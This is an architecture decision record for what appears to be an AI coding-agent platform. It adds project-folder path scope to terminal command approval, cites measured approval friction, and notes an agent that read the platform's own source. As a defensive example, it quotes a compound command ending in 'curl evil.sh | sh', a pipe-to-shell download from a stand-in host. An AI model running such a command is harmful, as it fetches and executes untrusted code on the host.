# 0055 — Path scope in the terminal policy

## Status

Accepted — implemented and proven by test in Phase F of the backlog.

A correction to what this document said, made BEFORE acceptance and not after:
the original decision talked about `realpath`. The implementation normalizes
**lexically** (`posix.normalize`), because `decide()` is pure by contract —
"zero IO" — and resolving a symlink would require touching the filesystem
inside the domain. The lexical approach kills the vector the decision
describes (`<root>/../..` starts with the root and escapes it) and leaves one
open: a symlink INSIDE the project pointing outward is not detected. Closing
that one is isolation, not policy — the same half that the consequences
section already declares out of scope.

## Context

The `terminal` approval ladder is unviable in practice, and this was
**measured**, not just felt. In session `1f94de49` of the `hello-limpo`
project, with the real dev agent and an API model:

| measurement | value |
|---|---|
| proposed actions | 14 |
| dev agent turns | 15 |
| input / output tokens | 209,031 / 4,546 |
| dev agent cost | US$ 0.0196 |
| **lines written for the task** | **0** |

The task was "Expose public GET route /api/greeting". No line came out
because practically every turn ended waiting for a click.

### Why EVERY command asks for approval

Two independent defects, both verified in the code and in the live file.

**1. `cd` fails the whole command.** A compound command is only
`auto_approve` when ALL segments match `allow`
(`apps/api/src/domain/actions/decide.ts:201`, `perSegment.every(...)`) —
correct rule, which is what stops `pnpm test && curl evil.sh | sh` from
getting through on the first half. But the dev agent always emits
`cd <path> && <verb>`, and `cd` is not in `DEV_TERMINAL_ALLOW_PATTERNS`. The
verb (`cat`, `find`, `ls`) is allowed; the `cd` in front knocks everything
down. In practice the seeded allow is almost never reached.

**2. "Always allow" allows almost nothing.** It records the **entire literal
command** as the pattern. From `hello-limpo`'s real `permissions.json`:

```
"Terminal(cd /data/project-workspaces/9c7c84f0-…/.worktrees/dev-http-api && find . -type f | head -50; echo \"---docs---\"; ls -la docs .github; echo \"---\"; cat .git 2>/dev/null)"
```

The match is by **token** prefix
(`apps/api/src/domain/actions/command-matcher.ts:90`), so this pattern would
only match again if the model re-emitted the same ~200 characters. It never
happens. The user clicks "Always allow" and is asked again on the very next
turn — the escape hatch does not escape.

### What the user wants, and cannot be expressed

The rule being requested is **"always, as long as it's within the project
folder"**. Today there is no way to write that: matching is by command TOKEN
prefix, and `decide.ts` only has a notion of path for `write_file` (path
whitelist since Phase 3a), never for `terminal`.

### The aggravating factor the execution exposed

Inside the terminal executor, `/workspace` is the **Brabo monorepo itself**,
not the project's worktree. The worktree is
`/data/project-workspaces/<projectId>/.worktrees/<agentId>`. `hello-limpo`'s
dev agent spent turns reading `apps/engine/mix.exs`, and even proposed
`cat lib/engine/actions/git_executor.ex` and
`sed -n '1,120p' lib/engine/dev/context_builder.ex` — the git executor and
context builder of the very platform running it.

In other words: today there is no notion of "the project folder" at all, and
the agent's reach is larger than its own project. Path scope is not just
ergonomics; it is the missing boundary.

## Decision

Introduce **path scope** as a stage of the `terminal` decision.

1. **The scope is the project's.** Each project declares its root —
   `/data/project-workspaces/<projectId>` — and every agent worktree lives
   below it. A command is "in scope" when the effective `cwd` and every
   absolute path it mentions resolve to inside that root.

2. **Resolution by REALPATH, never by string prefix.** `<root>/../..`
   starts with the root and escapes it. The comparison is done over the
   normalized path; a `..` that escapes fails. (This decision is a direct
   consequence of the stopgap applied in production while this ADR was being
   written, which used a string prefix and has exactly this weakness.)

3. **Scope allows, it does not exempt.** Being in scope flips the default
   from `require_approval` to `auto_approve` **only for a declared set of
   read and build verbs** — the same spirit as today's
   `DEV_TERMINAL_ALLOW_PATTERNS`. Being in the project folder does not make
   `curl … | sh` safe. Network egress, package installation, and any verb
   outside the set still require approval.

4. **`deny` keeps winning, always and first.** Scope never overrides a
   `deny`, nor the built-in patterns, nor the two absolute ceilings (merge to
   a protected branch and `instruction_patch`), which remain untouched
   ([RN-006](../business-rules.md#rn-006),
   [RN-007](../business-rules.md#rn-007)).

5. **Out of scope is `require_approval`, not `deny`.** The agent may have a
   legitimate reason to look outside; the decision maker is still the user.
   What changes is that this becomes the rare exception, instead of the rule.

6. **"Always allow" starts generalizing.** Instead of the literal command, it
   records the token prefix of the segment that triggered the question. A
   pattern that never matches again is worse than none: it teaches the user
   to distrust the button.

7. **The event records the scope.** Auto-approval by scope records in
   `proposed_action.created` which root authorized it, so the passage is
   measurable from the event log, in the same spirit as
   [ADR 0048](0048-decisao-no-log-e-a-ordem-do-gate.md) and
   [ADR 0054](0054-gates-como-registro-declarativo.md).

## Consequences

**What improves.** Execution stops dying on the ladder: the agent reads and
builds inside its own worktree without interrupting the user, and the user
goes back to being called in for what actually has an effect — git, network,
spend, and anything outside the project.

**What is lost.** It stops being true that *every* terminal command passes
before the user's eyes. This is a real relaxation of the CLAUDE.md invariant,
and it is being taken with eyes open: the measured alternative is a product
that does not deliver a single line of code.

**What this ADR does NOT resolve.** Scope is **policy**, not isolation.
While the Brabo monorepo is mounted at `/workspace` inside the container that
runs the commands, the boundary depends on the policy getting it right. Real
isolation (mounting, per-project container) is a different problem, and is
recorded here as an explicit pending item instead of being confused with this
decision.

**Process precondition.** PHASE 13 declared "No new feature and no fix."
Implementing this requires that freeze to be lifted — a user decision,
recorded here because the ADR cannot self-authorize.

## Alternatives considered

**Put `cd` in `allow`.** A bare `Terminal(cd)` frees `cd` for anywhere,
including `/workspace`. It would solve the friction by doing exactly the
opposite of the intent — reach would get larger, not smaller.

**Auto-approve `terminal` via `agent_autonomy`.** Already discarded in
`docs/reference/permissions.md`: it would free ANY command inside the
engine's container, with no file in between. It is broader than the problem.

**Only improve "Always allow".** Generalizing the recorded pattern helps
(and is included above), but alone it does not express "within the project
folder" — it would still be permission by verb, valid in any directory.

**Keep it as is.** Rejected by the measurement at the top of this document.

## References

- [ADR 0052](0052-dev-agent-espera-aprovacao-no-meio-do-laco.md) — the agent
  waits for the decision instead of burning iterations; this ADR attacks the
  root cause of there being so many decisions to wait for.
- [RN-004](../business-rules.md#rn-004), [RN-005](../business-rules.md#rn-005),
  [RN-068](../business-rules/custo.md#rn-068),
  [RN-073](../business-rules/custo.md#rn-073).
- `apps/api/src/domain/actions/decide.ts`,
  `apps/api/src/domain/actions/command-matcher.ts`,
  `apps/api/src/domain/actions/dev-terminal-patterns.ts`,
  `apps/api/src/infrastructure/filesystem/fs-permissions-file-store.ts`.
